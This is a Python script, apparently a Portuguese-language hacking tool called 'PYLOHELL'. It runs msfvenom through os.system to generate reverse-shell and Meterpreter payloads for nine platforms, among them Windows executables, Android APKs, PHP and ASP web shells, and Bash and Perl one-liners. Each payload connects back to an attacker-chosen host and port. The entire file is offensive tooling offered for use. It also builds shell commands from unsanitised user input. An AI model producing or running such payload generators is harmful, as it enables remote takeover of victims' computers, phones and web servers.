import function
import sys
import os

print("""
\033[32m██████╗ ██╗   ██╗██╗      ██████╗ \033[0;0m\033[31m██╗  ██╗███████╗██╗     ██╗     \033[0;0m     
\033[32m██╔══██╗╚██╗ ██╔╝██║     ██╔═══██╗\033[0;0m\033[31m██║  ██║██╔════╝██║     ██║     \033[0;0m
\033[32m██████╔╝ ╚████╔╝ ██║     ██║   ██║\033[0;0m\033[31m███████║█████╗  ██║     ██║     \033[0;0m
\033[32m██╔═══╝   ╚██╔╝  ██║     ██║   ██║\033[0;0m\033[31m██╔══██║██╔══╝  ██║     ██║     \033[0;0m
\033[32m██║        ██║   ███████╗╚██████╔╝\033[0;0m\033[31m██║  ██║███████╗███████╗███████╗\033[0;0m
""")
function.Argumentos()

pr = str(input("\033[32mEscolha Uma Opção >> \033[0;0m"))  
if pr == str('-pyl'):
	print("""\033[31m     Selecione Qual Exploit Deseja Utilizar
	 MsfVenom - Exploit 	use/exploit/msf
		""")
	pr2 = str(input("\033[32mpylohell >> \033[0;0m"))
else:
	print("Exploit Não Econtrado")
	sys.exit(0)

if pr2 == str('use/exploit/msf'):
	host  = str(input("\033[32m-Host: \033[0;0m"))
	port = str(input("\033[32m-Lport: \033[0;0m"))
	print("""\033[31mPayloads
		+---------------------+
			1 - Python
			2 - Windows
			3 - Php
			4 - Android/Apk
			5 - Mac/Os
			6 - Linux
			7 - ASP
			8 - Bash
			9 - Perl
			10 - EXIT
		+---------------------+
		\033[0;0m""")
	pay = str(input("\033[32mPayload >> \033[0;0m"))
if pay == str(1):
	cmd1 = os.system("msfvenom -p cmd/unix/reverse_python LHOST="+host+" LPORT="+port+" -f raw > shell.py")
	print("\033[31mPayload criado com Sucesso!\033[0;0m")
	pay = str(input("\033[32mPayload >> \033[0;0m"))
if pay == str(2):
	cmd1 = os.system("msfvenom -p windows/meterpreter/reverse_tcp LHOST="+host+" LPORT="+port+" -f exe > shell.exe")
	print("\033[31mPayload criado com Sucesso!\033[0;0m")
	pay = str(input("\033[32mPayload >> \033[0;0m"))
if pay == str(3):
	cmd1 = os.system("msfvenom -p php/meterpreter_reverse_tcp LHOST="+host+" LPORT="+port+" -f raw > shell.php")
	print("\033[31mPayload criado com Sucesso!\033[0;0m")
	pay = str(input("\033[32mPayload >> \033[0;0m"))
if pay == str(4):
	cmd1 = os.system("msfvenom -p android/meterpreter/reverse_tcp LHOST="+host+" LPORT="+port+" R > shell.apk")
	print("\033[31mPayload criado com Sucesso!\033[0;0m")
	pay = str(input("\033[32mPayload >> \033[0;0m"))
if pay == str(5):
	cmd1 = os.system("msfvenom -p osx/x86/shell_reverse_tcp LHOST="+host+" LPORT="+port+" -f macho > shell.macho")
	print("\033[31mPayload criado com Sucesso!\033[0;0m")
	pay = str(input("\033[32mPayload >> \033[0;0m"))
if pay == str(6):
	cmd1 = os.system("msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST="+host+" LPORT="+port+" -f elf > shell.elf")
	print("\033[31mPayload criado com Sucesso!\033[0;0m")
	ppay = str(input("\033[32mPayload >> \033[0;0m"))
if pay == str(7):
	cmd1 = os.system("msfvenom -p windows/meterpreter/reverse_tcp LHOST="+host+" LPORT="+port+" -f asp > shell.asp")
	print("\033[31mPayload criado com Sucesso!\033[0;0m")
	pay = str(input("\033[32mPayload >> \033[0;0m"))
if pay == str(8):
	cmd1 = os.system("msfvenom -p cmd/unix/reverse_bash LHOST="+host+" LPORT="+port+" -f raw > shell.sh")
	print("\033[31mPayload criado com Sucesso!\033[0;0m")
	pay = str(input("\033[32mPayload >> \033[0;0m"))
if pay == str(9):
	cmd1 = os.system("msfvenom -p cmd/unix/reverse_perl LHOST="+host+" LPORT="+port+" -f raw > shell.pl")
	print("\033[31mPayload criado com Sucesso!\033[0;0m")
	pay = str(input("\033[32mPayload >> \033[0;0m"))
if pay == str(10):
	sys.exit(0)
